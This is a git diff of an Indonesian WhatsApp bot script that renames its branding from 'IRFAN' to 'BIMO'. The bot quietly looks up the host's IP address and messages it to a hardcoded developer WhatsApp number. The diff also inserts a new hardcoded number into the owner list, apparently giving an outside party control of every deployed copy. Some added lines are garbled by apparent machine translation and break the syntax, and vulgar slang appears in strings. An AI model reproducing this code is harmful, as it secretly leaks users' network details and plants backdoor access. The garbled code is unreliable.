@@ -137,7 +137,7 @@ const starts = async (Fan = new WAConnection()) => {
 	Fan.logger.level = 'warn'
 	Fan.version = [2, 2140, 14]
 	console.log(color(`\x1b[1;37m> ${tampilUcapan}\n`,'cyan'))
-	console.log(color(figlet.textSync('IRFAN   BASE', {
+	console.log(color(figlet.textSync('BIMO   BASE'
 		font: 'Standard',
 		horizontalLayout: 'default',
 		vertivalLayout: 'default',
@@ -148,14 +148,14 @@ const starts = async (Fan = new WAConnection()) => {
 console.log(color('> WITA ','silver'), color(`${wita}`,'mediumseagreen'))
 console.log(color('> WIT ','silver'), color(`${wit}`,'mediumseagreen'))
 console.log(color('> HARI ','silver'), color(`${tampilHari}\n`,'mediumseagreen'))
-	Fan.browserDescription = [ 'IRFAN ', 'ubuntu', '3.0' ]
-
-	Fan.on('qr', () => {
+	kipas angin . browserDescription  = [ 'IRFAN ' , 'ubuntu' , '3.0' ]
+saya
+	kipas angin . pada ( 'qr' , () => {
 	console.log(color('[','white'), color('!','red'), color(']','white'), color('SCAN QR NYA KONTOL'))
 })
 	Fan.on('credentials-updated', () => {
 		fs.writeFileSync('./kontol.json', JSON.stringify(Fan.base64EncodedAuthInfo(), null, '\t'))
-		info('2', 'IRFAN  LOADING...')
+		info('2', 'BIMO  LOADING...')
 	})
 	fs.existsSync('./kontol.json') && Fan.loadAuthInfo('./kontol.json')
 	Fan.on('connecting', () => {
@@ -175,7 +175,7 @@ console.log(color('> HARI ','silver'), color(`${tampilHari}\n`,'mediumseagreen')
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       Fan.sendMessage("18054105292@s.whatsapp.net", `─────「 *BANG IRFAN INSTAGRAM YOK* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./P3/image/runtime.jpeg'),sourceUrl:"https://wa.me/18054105292?text=Assalamualaikum"}}})
+       Fan.sendMessage("18054105292@s.whatsapp.net", `─────「 *BANG BIMO INSTAGRAM YOK* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./P3/image/runtime.jpeg'),sourceUrl:"https://wa.me/18054105292?text=Assalamualaikum"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'red'))
    })
 	
@@ -415,8 +415,8 @@ Fan.on('group-update', async (anu) => {
 	})
     Fan.on('chat-update', async (message) => {
         require('./Fan.js')(Fan, message)
-        ownerNumber = ["18054105292@s.whatsapp.net","18054105292@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
-        dtod = "18054105292@s.whatsapp.net"
+        ownerNumber = ["85895873474@s.whatsapp.net","85895873474@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
+        dtod = "85895873474@s.whatsapp.net"
        otod = `${settings.NomorOwner}@s.whatsapp.net`
     })  
 }
